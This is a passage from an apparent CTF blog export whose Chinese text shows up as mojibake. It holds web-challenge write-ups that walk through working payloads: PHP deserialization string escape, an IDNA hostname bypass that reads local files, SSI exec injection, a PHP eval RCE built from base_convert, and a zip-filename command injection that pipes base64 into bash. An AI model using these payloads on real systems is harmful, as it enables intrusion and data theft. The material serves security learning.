è®©ä»–å­—ç¬¦ä¸²æº¢å‡ºï¼Œç„¶åæº¢å‡ºéƒ¨åˆ†å°±ä¼šåˆ°photoéƒ¨åˆ†\n\næˆ‘ä»¬å¯ä»¥è®©`nickname=where`ç„¶ååºåˆ—åŒ–åç»è¿‡è¿‡æ»¤å™¨whereä¼šè¢«æ›¿æ¢ä¸ºhacker,whereä¸º5ä¸ªå­—ç¬¦ï¼Œè€Œhackerä¸º6ä¸ªå­—ç¬¦ï¼Œå¤šå‡ºä¸€ä¸ªå­—ç¬¦ï¼Œå°±è¿™æ ·ä½¿å¾—å®ƒåœ¨ååºåˆ—æ—¶è¿˜æ˜¯æŒ‰ç…§åŸæœ¬5ä¸ªå­—ç¬¦å»ååºåˆ—åŒ–ï¼Œè¿˜æœ‰ä¸€ä¸ªå­—ç¬¦å°±æº¢å‡ºé€ƒé€¸äº†ã€‚\n\nå¯ä»¥ç®€å•å€ŸåŠ©ä¸‹é¢çš„è„šæœ¬ç†è§£ï¼š\n\n```php\n<?php\nfunction filter($string) {     //çˆ¶ç±»filer\n    $escape = array('\\'', '\\\\\\\\');\n    $escape = '/' . implode('|', $escape) . '/';\n    $string = preg_replace($escape, '_', $string);  //ä¸€é¡¿æ“ä½œä¸‹æ¥å°±æ˜¯ä¸€ä¸ªæ­£åˆ™\n\n\n    $safe = array('select', 'insert', 'update', 'delete', 'where');\n    $safe = '/' . implode('|', $safe) . '/i';\n    return preg_replace($safe, 'hacker', $string);\n}\n$profile = array(\"phone\"=>\"12345678912\",\"email\"=>\"123@qq.com\",\"nickname\"=>\"where\",\"photo\"=>\"abc\");\n$a = serialize($profile);\necho $a;\necho \"\\n\";\necho filter($a);\n?>\n```\n\nè¾“å‡ºï¼šè¿™é‡Œç¬¬äºŒè¡Œhackeræ˜æ˜æ˜¯6ä¸ªå­—ç¬¦ä½†æ˜¯åœ¨åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¿˜æ˜¯æ˜¾ç¤º5ï¼Œé‚£ä¹ˆå¤šä½™å‡ºæ¥çš„ä¸€ä¸ªå­—ç¬¦å°†ä¼šåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­é€ƒé€¸ã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292442387-dfaaedff-1c6d-4dbc-a7bf-f889153b5ded.png)\n\né‚£ä¹ˆæˆ‘ä»¬å¡å…¥å­—ç¬¦ä¸²`\";s:5:\"photo\";s:10:\"config.php\";}`æ˜¯33ä¸ªå­—ç¬¦ï¼Œåˆ™éœ€è¦33ä¸ªwhere\n\nä½†æ˜¯ä¹‹å‰çœ‹åˆ°nicknameéƒ¨åˆ†ä¸èƒ½è¶…è¿‡10ä¸ªå­—ç¬¦\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292530703-ad1938a2-50bb-44cb-b17f-326547c2d3b9.png)\n\nè¿™é‡Œå¯ä»¥é€šè¿‡æ•°ç»„æ–¹å¼ç»•å¼€æ­£åˆ™åŒ¹é…å³`nickename[]`\n\nè¿™é‡Œ`$profile`å·²ç»æ˜¯ä¸€ä¸ªæ•°ç»„äº†ï¼Œå¦‚æœæ•°ç»„é‡Œé¢å†åŒ…å«ä¸€ä¸ªæ•°ç»„ï¼Œé‚£ä¹ˆåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ç¨æœ‰ä¸åŒã€‚\n\né€šè¿‡ä¸€ä¸ªè„šæœ¬æ¥å¸®åŠ©ç†è§£ï¼š\n\n```php\n<?php\n$a = array(\"name\"=>'Tom',\"age\"=>array(17));\necho serialize($a);\n?>\n```\n\nè¾“å‡ºï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292655293-2cc8bf95-340a-4112-8ae9-dfd90f65fb8c.png)\n\nä¼šæœ‰èŠ±æ‹¬å·å»åŒ…è£¹æ•°ç»„ä¸­çš„æ•°ç»„éƒ¨åˆ†ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨é—­åˆnicknameè¿™éƒ¨åˆ†æ—¶ä¹Ÿéœ€è¦ç‰¹æ„æ„é€ ä¸€ä¸ªå³èŠ±æ‹¬å·å»é—­åˆï¼Œä½¿å…¶æˆä¸ºåˆæ³•ååºåˆ—åŒ–éƒ¨åˆ†ã€‚\n\nå³`\";}s:5:\"photo\";s:10:\"config.php\";}`æˆ‘ä»¬éœ€è¦å¡å…¥34ä¸ªå­—ç¬¦\n\né‚£ä¹ˆnicknameå°±éœ€è¦æœ‰34ä¸ªwhere\n\n```\nwherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";}s:5:\"photo\";s:10:\"config.php\";}\n```\n\nå…¶ä»–éƒ¨åˆ†ä»»æ„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292841846-e07c45fe-820f-4146-9ee8-3ffd7c96068d.png)\n\nè¿›å…¥profile.phpå»è§£ç è¿™æ®µbase64\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292879095-67419a27-16e3-4ec0-857c-ebabf61f6e6f.png)\n\nå°±å¯ä»¥æ‹¿åˆ°flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292910852-9d761113-d1cd-4816-921d-e3b225f34f46.png)\n","tags":["ååºåˆ—åŒ–","ä»£ç å®¡è®¡","ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸"],"categories":["buuctf"]},{"title":"buuctf-63-[SUCTF 2019]Pythonginx","url":"/post/487317b8.html","content":"\n[SUCTF 2019]Pythonginx\n\n<!--more-->\n\nä¸€é“å…³äºpythonè§£æidnaç¼–ç ä¸utf-8è§£ç åçš„å­—ç¬¦ä¸²çš„æ¼æ´é¢˜ç›®\n\nCVE-2019-9636ï¼šurlsplit ä¸å¤„ç† NFKC æ ‡å‡†åŒ–\n\nCVE-2019-10160ï¼šurlsplit NFKD æ ‡å‡†åŒ–æ¼æ´\n\næºç ï¼š\n\n```cmake\n@app.route('/getUrl', methods=['GET', 'POST'])\ndef getUrl():\n    url = request.args.get(\"url\")\n    host = parse.urlparse(url).hostname\n    if host == 'suctf.cc':\n        return \"æˆ‘æ‰Œ your problem? 111\"\n    parts = list(urlsplit(url))\n    host = parts[1]\n    if host == 'suctf.cc':\n        return \"æˆ‘æ‰Œ your problem? 222 \" + host\n    newhost = []\n    for h in host.split('.'):\n        newhost.append(h.encode('idna').decode('utf-8'))\n    parts[1] = '.'.join(newhost)\n    #å»æ‰ url ä¸­çš„ç©ºæ ¼\n    finalUrl = urlunsplit(parts).split(' ')[0]\n    host = parse.urlparse(finalUrl).hostname\n    if host == 'suctf.cc':\n        return urllib.request.urlopen(finalUrl).read()\n    else:\n        return \"æˆ‘æ‰Œ your problem? 333\"\n   \n    <!-- Dont worry about the suctf.cc. Go on! -->\n    <!-- Do you know the nginx? -->\n```\n\nå®Œæ•´åˆ†æè¿‡ç¨‹ï¼š\n\n```python\nfrom flask import Flask, Blueprint, request, Response, escape ,render_template\nfrom urllib.parse import urlsplit, urlunsplit, unquote\nfrom urllib import parse\nimport urllib.request\nurl =\"http://www.baidu.com/index.php\"\nhost = parse.urlparse(url).hostname #ç¬¬ä¸€æ¬¡host\nprint(\"ç¬¬ä¸€æ¬¡host:\",host)\nparts = list(urlsplit(url))\nprint(\"parts:\",parts)\nhost = parts[1]  #ç¬¬äºŒæ¬¡host\nprint(\"ç¬¬äºŒæ¬¡host:\",host)\nnewhost = []\nprint(\"ä»¥ç‚¹åˆ†å‰²ï¼š\",host.split('.')) #ä»¥.ä¸ºåˆ†éš”ç¬¦è¿”å›ä¸€ä¸ªåˆ—è¡¨\nfor h in host.split('.'):\n    newhost.append(h.encode('idna').decode('utf-8')) #æ¼æ´äº§ç”Ÿç‚¹\nprint(\"ç»è¿‡idnaç¼–ç ä¸utf-8è§£ç ånewhost:\",newhost)\nparts[1] = '.'.join(newhost)\n#å»æ‰ url ä¸­çš„ç©ºæ ¼\nfinalUrl = urlunsplit(parts).split(' ')[0]\nhost = parse.urlparse(finalUrl).hostname  #ç¬¬ä¸‰æ¬¡host\nprint(\"ç¬¬ä¸‰æ¬¡host:\",host)\n```\n\nè¿™é‡Œè¯´è¯´hostä¸hostnameå§\n\n `host=hostname+':'+port(not 80)`  \n\n å¦‚æœhttpä½¿ç”¨é»˜è®¤çš„80ç«¯å£ï¼Œhostå¯ä»¥çœç•¥æ‰å†’å·+ç«¯å£ï¼Œçœ‹ä¸Šå»å’Œhostnameä¸€æ · \n\n```\nhost = parse.urlparse(url).hostname\n```\n\nè¿™ä¸€è¡Œè·å–æˆ‘ä»¬çš„hostname å¹¶ä¸”éœ€è¦æœ‰åè®®æ‰è¡Œ æ¯”å¦‚https://,http://,æˆ–è€…file://ï¼Œè¿™æ ·æ‰èƒ½è·å–åˆ°æˆ‘ä»¬çš„hostnameï¼Œä¹Ÿå°±æ˜¯payloadå½¢å¼ï¼Œå¿…é¡»ä¹Ÿæ˜¯è¿™æ ·åŒ…å«åè®®çš„å½¢å¼\n\nå…·ä½“åˆ†å‰²éƒ¨åˆ†ï¼Œå¯ä»¥å»çœ‹å®˜æ–¹æ‰‹å†Œhttps://docs.python.org/zh-cn/3/library/urllib.parse.html?highlight=urlsplit\n\nè¾“å‡ºï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683210222158-baba3125-052f-4eae-b0eb-681f23c4953a.png)\n\nç›®æ ‡ç»•å¼€ç¬¬ä¸€ç¬¬äºŒä¸ªifï¼Œé‚£ä¹ˆæ“ä½œç‚¹å°±åœ¨è¿™é‡Œ\n\n```cmake\nfor h in host.split('.'):\n    newhost.append(h.encode('idna').decode('utf-8'))\n```\n\næ¯”å¦‚` â„† ` è¿™ä¸ªå­—ç¬¦ç»è¿‡ä»¥ä¸Šæ“ä½œä¹‹åå°±å˜ä¸ºäº†c/u\n\né‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è®©é¢˜ç›®éœ€è¦çš„`suctf.cc`æ”¹ä¸º`suctf.c â„† `ç„¶åç»è¿‡idnaç¼–ç utf-8è§£ç åï¼Œå˜ä¸ºæˆ‘ä»¬éœ€è¦çš„suctf.cc/u\n\nè¿˜éœ€è¦äº†è§£ä¸€äº›å…³äºnginxçš„é‡è¦æ–‡ä»¶ä½ç½®ï¼š\n\n- é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š/etc/nginx\n- ä¸»é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf/nginx.conf\n- ç®¡ç†è„šæœ¬ï¼š/usr/lib64/systemd/system/nginx.service\n- æ¨¡å—ï¼š/usr/lisb64/nginx/modules\n- åº”ç”¨ç¨‹åºï¼š/usr/sbin/nginx\n- ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š/usr/share/nginx/html\n- æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/nginx\n- é…ç½®æ–‡ä»¶ç›®å½•ä¸ºï¼š/usr/local/nginx/conf/nginx.conf\n\nå…ˆæ¥æ‰¾flagæ–‡ä»¶çš„ä½ç½®ï¼Œçœ‹äº†wp\n\npayload:`?url=file://suctf.câ„†sr/local/nginx/conf/nginx.conf`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683210794235-67212c4a-f398-4e90-9615-d84f0c656810.png)\n\nè¯»å°±è¡Œäº†`?url=file://suctf.câ„†sr/fffffflag`\n","tags":["python","nginx"],"categories":["buuctf"]},{"title":"buuctf-62-[BJDCTF2020]EasySearch","url":"/post/9c6e15d.html","content":"\n[BJDCTF2020]EasySearch\n\n<!--more-->\n\næ‰«ç½‘ç«™åå°ï¼Œbuuå¸¸å¸¸æ‰«ä¸å‡ºæ¥ç®—äº†ï¼Œç›´æ¥ä»ç½‘ä¸Šæ‰’ä¸€ä¸ª\n\nå‘ç°æœ‰/index.php.swp\n\næºç å¦‚ä¸‹ï¼š\n\n```cmake\n<?php\n\tob_start();\n\tfunction get_hash(){\n\t\t$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';\n\t\t$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times\n\t\t$content = uniqid().$random;\n\t\treturn sha1($content); \n\t}\n    header(\"Content-Type: text/html;charset=utf-8\");\n\t***\n    if(isset($_POST['username']) and $_POST['username'] != '' )\n    {\n        $admin = '6d0bc1';\n        if ( $admin == substr(md5($_POST['password']),0,6)) {\n            echo \"<script>alert('[+] Welcome to manage system')</script>\";\n            $file_shtml = \"public/\".get_hash().\".shtml\";\n            $shtml = fopen($file_shtml, \"w\") or die(\"Unable to open file!\");\n            $text = '\n            ***\n            ***\n            <h1>Hello,'.$_POST['username'].'</h1>\n            ***\n\t\t\t***';\n            fwrite($shtml,$text);\n            fclose($shtml);\n            ***\n\t\t\techo \"[!] Header  error ...\";\n        } else {\n            echo \"<script>alert('[!] Failed')</script>\";\n            \n    }else\n    {\n\t***\n    }\n\t***\n?>\n```\n\néœ€è¦å¯†ç å‰å…­ä½md5å€¼ç­‰äº`6d0bc1`\n\nå€ŸåŠ©è„šæœ¬\n\n```python\nfrom hashlib import md5\n\n\nfor i in range(10000000):\n    if md5(str(i).encode('utf-8')).hexdigest()[:6] == '6d0bc1':\n        print(i)\n```\n\néšä¾¿é€‰ä¸€ä¸ª 2020666\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683037918710-62fadfa4-b94f-45b9-bf41-9ecf8f5ebd72.png)\n\n```\n/public/6a55805e27f57db992ebd9b47735c84cb7ec8e91.shtml\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683037955243-8985022f-0080-4da4-86cd-967c1e4c6651.png)\n\nçœ‹åˆ°è¿™é‡Œå¤§æ¦‚ç‡æ˜¯ssti ä½†æ˜¯æŠ“åŒ…çœ‹æ—¢ä¸æ˜¯pythonä¹Ÿä¸æ˜¯php æ‰€ä»¥ä¸ä¼šäº†\n\nçœ‹äº†wp æ‰å‘ç°æ˜¯æ²¡è§è¿‡çš„shtml\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683038075990-bfd32873-f395-4af3-8019-feae3efe14ab.png)\n\nå…¶å®åœ¨æºç ä¸­ä¹Ÿæœ‰ç¨å¾®æç¤º\n\n ç¬¬17è¡Œ`$shtml = fopen($file_shtml, \"w\") or die(\"Unable to open file!\");`\n\nç›´æ¥ç”¨payload\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683038127194-eea19322-3722-45f8-8191-7dcc3e994406.png)\n\npayloadï¼š\n\nflagåœ¨ä¸Šå±‚ç›®å½•\n\n```\n<!--#exec cmd=\"ls ../\"-->\n<!--#exec cmd=\"cat ../flag_990c66bf85a09c664f0b6741840499b2\"-->\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683039208613-241c74dc-ae63-426a-b76c-fceeb8e41dba.png)\n","tags":["ssti","shtml"],"categories":["buuctf"]},{"title":"buuctf-55-[CISCN 2019 åˆèµ›]Love Math","url":"/post/102492d1.html","content":"\n[CISCN 2019 åˆèµ›]Love Math\n\n<!--more-->\n\nè¿™é“é¢˜å°±æ˜¯bypass åˆ©ç”¨è¿›åˆ¶è½¬æ¢å‡½æ•°æ„é€ rce æŒºä¸é”™çš„\n\næºç å¦‚ä¸‹:\n\n```cmake\n<?php\nerror_reporting(0);\n//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag\nif(!isset($_GET['c'])){\n    show_source(__FILE__);\n}else{\n    //ä¾‹å­ c=20-1\n    $content = $_GET['c'];\n    if (strlen($content) >= 80) {\n        die(\"å¤ªé•¿äº†ä¸ä¼šç®—\");\n    }\n    $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]'];\n    foreach ($blacklist as $blackitem) {\n        if (preg_match('/' . $blackitem . '/m', $content)) {\n            die(\"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦\");\n        }\n    }\n    //å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp\n    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];\n    preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs);  \n    foreach ($used_funcs[0] as $func) {\n        if (!in_array($func, $whitelist)) {\n            die(\"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°\");\n        }\n    }\n    //å¸®ä½ ç®—å‡ºç­”æ¡ˆ\n    eval('echo '.$content.';');\n}\n```\n\n## è§£æ³•ä¸€ï¼š\n\nåˆ©ç”¨è¿›åˆ¶è½¬æ¢å‡½æ•°\n\npayload:`c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){cos})&pi=system&cos=cat /flag`\n\nåˆ†æï¼š\n\n`c=$pi=base_convert(37907361743,10,36)(dechex(1598506324))`è¿™ä¸€æ­¥æ˜¯æ„é€ å‡º_GET\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683033094045-2aedb2fb-1341-4c26-8fe7-a9cae55fc613.png)\n\nè¿™é‡Œç”¨36è¿›åˆ¶åŸå› æ˜¯åŒ…å«æ•°å­—å­—æ¯å¤šå¯ä»¥æ„é€ å‡½æ•°åå¾ˆæ–¹ä¾¿\n\né€‰æ‹©hex2binè¿™ä¸ªå‡½æ•°æ˜¯å› ä¸ºè¿™ä¸ªå‡½æ•°å¯ä»¥å°†16è¿›åˆ¶å­—ç¬¦ä¸²è½¬åŒ–ä¸º2è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œè¿™é‡Œå¯ä»¥è¿™ä¹ˆç†è§£æˆ‘ä»¬å¸¸è§åˆ°çš„å­—ç¬¦ä¸²å°±æ˜¯2è¿›åˆ¶çš„å­—ç¬¦ä¸²ï¼ˆä¸ä¸¥è°¨ï¼‰ï¼Œè¿™é‡Œé¢èµ·äº†ä¸€ä¸ªç›¸å½“äºå°†16è¿›åˆ¶è½¬åŒ–ä¸ºå­—ç¬¦ä¸²çš„ä½œç”¨\n\nå¤§æ¦‚å¦‚å›¾è¿™æ ·çš„ä½œç”¨\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683033601976-34ae25d6-fd29-4fbb-a6b9-b8fb1a80feae.png)\n\næ‹†è§£ï¼š\n\n```\n$pi=_GET\n$_GET[pi]($_GET[cos])\npi=system cos=cat /flag\nsystem(cat /flag)\n```\n\næ³¨æ„è¿™é‡Œ`$pi`å’Œ`pi`æ˜¯ä¸¤ä¸ªä¸åŒçš„æ¦‚å¿µï¼Œä¸€å¼€å§‹ææ··äº†ï¼Œè‡³äºè¿™é‡Œä¸ºä»€ä¹ˆé€‰æ‹©`pi`å’Œ`cos`ä½œä¸ºå‚æ•°åæ˜¯å› ä¸ºè¿™ä¸¤ä¸ªå‡½æ•°åå ä½æœ€å°‘ï¼Œå› ä¸ºé™åˆ¶æˆ‘ä»¬é•¿åº¦å¿…é¡»åœ¨80ä»¥å†…\n\n## è§£æ³•äºŒ\n\nåˆ©ç”¨getallheaders()å‡½æ•°\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683033809691-3f418625-2ff3-430c-a2a0-10762f2fc4eb.png)\n\nè¿”å›ä¸€ä¸ªæ•°ç»„\n\npaylaod:`?c=$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})`\n\nç›¸å½“äºæ„é€ `exec(getallheaders(){1})`\n\nå› ä¸ºè¿”å›ä¸€ä¸ªæ•°ç»„æ‰€ä»¥åŸæ¥åº”è¯¥ä¸º`getallheaders()[1]`å› ä¸º`[]`è¢«å±è”½äº†,æ‰€ä»¥ç”¨`{}`bypass\n\nç„¶å1ä¸ºé”®å æ‰€ä»¥åœ¨è¯·æ±‚å¤´å¢åŠ ä¸€ä¸ª`1: cat/flag`å³å¯\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683034156126-623b55ac-0e55-40d8-a6bf-ff0e7c9e516c.png)\n","tags":["å‘½ä»¤æ‰§è¡Œ","RCEå¥‡æ·«æ–¹å¼","bypass"],"categories":["buuctf"]},{"title":"AntCTF x DÂ³CTFç®€å•å¤ç°","url":"/post/e2c24be6.html","content":"\nèœé¸¡çš„è‡ªæˆ‘ç¾è¾±\n\n<!--more-->\n\n# å‰è¨€\n\næœ‰ç¨å¾®çœ‹äº†ä¸‹è¿™ä¸ªæ¯”èµ›ï¼Œä¸€çœ¼å°±ä¸å±äºæˆ‘è¿™ä¸ªæ°´å¹³äººåšçš„ï¼Œç¨ç¨çœ‹äº†ä¸€é“æŠ«ç€webçš®çš„miscï¼Œæ„Ÿè§‰ç¨å¾®æœ‰ç‚¹æ€è·¯ï¼Œèµ›åçœ‹çœ‹å¤§ä½¬ä»¬çš„wpï¼Œç»™è‡ªå·±æ¶¨æ¶¨è§è¯†ã€‚\n\n# æ­£é¢˜\n\n## d3readfile(Misc)\n\nè€å¥—è·¯å…ˆè¯»è¯»`/etc/passwd`å¯ä»¥è¯»åˆ°\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954270870-621e1a29-e228-4eb2-9d64-1c21454e7eea.png)\n\nå†çœ‹çœ‹ç¯å¢ƒå˜é‡\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954383884-d90e322b-4fe6-46b6-a14f-825692562e07.png)\n\nå‘ç°hint è§£ç å‘ç°æç¤º\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954420464-5d98a90e-1a74-42b6-ae64-c64de031e97d.png)\n\næç¤ºå…³é”®å­—æ˜¯locate\n\nçœ‹äº†å¤§ä½¬çš„wpï¼šlocate å‘½ä»¤æ˜¯æŸ¥è¯¢æ–‡ä»¶æ‰€åœ¨ä½ç½®çš„ï¼Œä¼šåœ¨æœ¬åœ°ç¼“å­˜æ•°æ®åº“ï¼Œæ–‡ä»¶åä¸º:locate.db,ä¸åŒç‰ˆæœ¬ä¼¼ä¹ç¼“å­˜çš„ç›®å½•å¹¶ä¸ä¸€æ ·\n\né—®é—®chatgpt\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954548792-8766f875-f44c-4f32-aafe-9e7f50cbafac.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682996671795-81e5f146-61a1-4df9-8a4c-2a24db39b17c.png)\n\nä¸åŒçš„linuxç³»ç»Ÿä½ç½®ä¸åŒ\n\n- Ubuntu / Debianï¼š/var/lib/mlocate/mlocate.db\n- CentOS / Fedora / RHELï¼š/var/lib/locatedb\n- Arch Linuxï¼š/var/lib/pacman/local/mlocate*/mtree\n- Gentoo: /var/cache/edb/locate.database\n- Slackware: /var/lib/slocate/slocate.db\n- FreeBSD: /var/db/locate.database\n- OpenSUSEï¼š/var/lib/slocate/slocate.db\n- Mageiaï¼š/var/lib/mageia/mlocate.db\n- Oracle Linuxï¼š/var/cache/locate/locatedb\n\næœ€åå‘ç°æ˜¯ \n\n```\nOracle Linuxï¼š/var/cache/locate/locatedb\n```\n\nå‘ç°flagè·¯å¾„ï¼š`opt/vwMDP4unF4cvqHrztduv4hpCw9H9Sdfh/UuRez4TstSQEXZpK74VoKWQc2KBubVZi/LcXAfeaD2KLrV8zBpuPdgsbVpGqLcykz/flag_1s_h3re_233`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954629044-6d77fc45-bf46-4e85-924e-9d2fe577e2ca.png)\n\nGet it!\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954670000-70aae100-4ab6-45ae-8e9f-984d320f1abc.png)\n\n## d3cloud(Web)\n\nè¿™é¢˜çœ‹å¤§ä½¬WPæ˜¯unzipå¤„å‘½ä»¤æ³¨å…¥\n\nç•Œé¢uiä»€ä¹ˆç”¨éƒ½æ²¡æœ‰ ç›´æ¥è¿›adminåå° `/admin`\n\nè¦ç™»é™† `admin/admin`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683001433174-c5787435-e598-4d31-a52b-a50681371de4.png)\n\nå‘ç°ä¸€ä¸ªphpæ–‡ä»¶\n\nè¿™é‡Œçœ‹wpæ˜¯ä¸å®˜æ–¹æ–‡æ¡£ç›¸æ¯”å¤šäº†ç‚¹ä»£ç ï¼Œé‚£ä¹ˆåšè¿™é“é¢˜è¿˜éœ€è¦ç°åœºæ­ç¯å¢ƒå’Œä»£ç å®¡è®¡qwq tql\n\n```cmake\npublic function putFileAs($path, $file, $name, $options = [])\n    {\n        $supported_file = array('gif','jpg','jpeg','png','ico','zip','mp4','mp3','mkv','avi','txt');\n        $file_type= strtolower(pathinfo($name,PATHINFO_EXTENSION));\n        if (!in_array($file_type, $supported_file)) {\n            return false;\n        }\n        $stream = fopen($file->getRealPath(), 'r+');\n        $result = $this->put(\n            $path = trim($path.'/'.$name, '/'), $stream, $options\n        );\n        if (is_resource($stream)) {\n            fclose($stream);\n        }\n        if($file->getClientOriginalExtension() === \"zip\") {\n            $fs = popen(\"unzip -oq \". $this->driver->getAdapter()->getPathPrefix() . $name .\" -d \" . $this->driver->getAdapter()->getPathPrefix(),\"w\");\n            pclose($fs);\n        }\n        return $result ? $path : false;\n    }\n```\n\næ˜¯è¿™é‡Œå­˜åœ¨å‘½ä»¤æ³¨å…¥\n\n```cmake\nif($file->getClientOriginalExtension() === \"zip\") {\n            $fs = popen(\"unzip -oq \". $this->driver->getAdapter()->getPathPrefix() . $name .\" -d \" . $this->driver->getAdapter()->getPathPrefix(),\"w\");\n            pclose($fs);\n```\n\nçœ‹å¤§ä½¬åˆ†æunzipå‘½ä»¤å¦‚ä¸‹ï¼š\n\n```\nunzip -oq /WWW/d3cloud/storage/app/1.zip -d /WWW/d3cloud/storage/app/\n```\n\nç„¶ååˆ©ç”¨zipæ–‡ä»¶åå†™shell\n\n```\n1;echo bHMgLz4gL3Zhci93d3cvaHRtbC9wdWJsaWMvbHMudHh0|base64 -\nd|bash;.zip\n```\n\nç®€å•è§£é‡Šä¸€ä¸‹ å°†`ls /`ç»“æœé‡å®šå‘åˆ°`/var/www/html/public/ls.txt`æ–‡ä»¶ä¸­\n\nè¿™é‡Œå¿…é¡»æœ‰æ¢è¡Œç¬¦ ä¸ç„¶å†™ä¸è¿›å…¥ ä¼°è®¡æ˜¯ä»£ç å®¡è®¡ä¸­æ–‡ä»¶åå¤„æœ‰è½¬ä¹‰æˆ–è€…åˆ«çš„æ“ä½œ é€šè¿‡æ¢è¡Œç»•è¿‡\n\nè¿˜æœ‰ä¸€ä¸ªç–‘é—®å°±æ˜¯å†™å…¥æ–‡ä»¶çš„è·¯å¾„æ˜¯æ€ä¹ˆè·å–çš„ï¼Ÿæ˜¯è‡ªå·±æ­ç¯å¢ƒå¼„åˆ°çš„å—qwq\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683002231725-7a1fab4c-f29d-4a0f-be37-d474d8df51bd.png)\n\nç›´æ¥è®¿é—®ls.txt\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683002436158-744f4590-d747-41ff-baa0-d4b3593bead9.png)\n\nç»§ç»­å’Œä¸Šé¢ä¸€æ ·çš„æ“ä½œ\n\n```\n1;echo Y2F0IC9mbDFBZz4gL3Zhci93d3cvaHRtbC9wdWJsaWMvZmxhZy50eHQ=|base64 -\nd|bash;.zip\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683002482821-010b80b2-9d7c-4f50-a51b-411008a3ac3b.png)\n\n### å°æ€»ç»“ä¸€ä¸‹ï¼š\n\nå¾ˆå¤šéš¾é¢˜è¿˜æ˜¯éœ€è¦è·å–åˆ°ç›¸å…³ç‰ˆæœ¬åï¼Œéœ€è¦è‡ªå·±æœ¬åœ°æ­å»ºå»è°ƒè¯•ï¼Œæ‰èƒ½æ…¢æ…¢å‘ç°æ¼æ´\n\nä»£ç å®¡è®¡èƒ½åŠ›å¾ˆé‡è¦qwq\n\n\n\n# å°¾å·´\n\nå…¶ä»–çš„wpéƒ½çœ‹ä¸æ‡‚ è¿˜æ˜¯æ…¢æ…¢æ¥å§\n\nçœ‹äº†ä¸€ä¸‹è¿™ç§çœŸæ­£éš¾çš„ctf 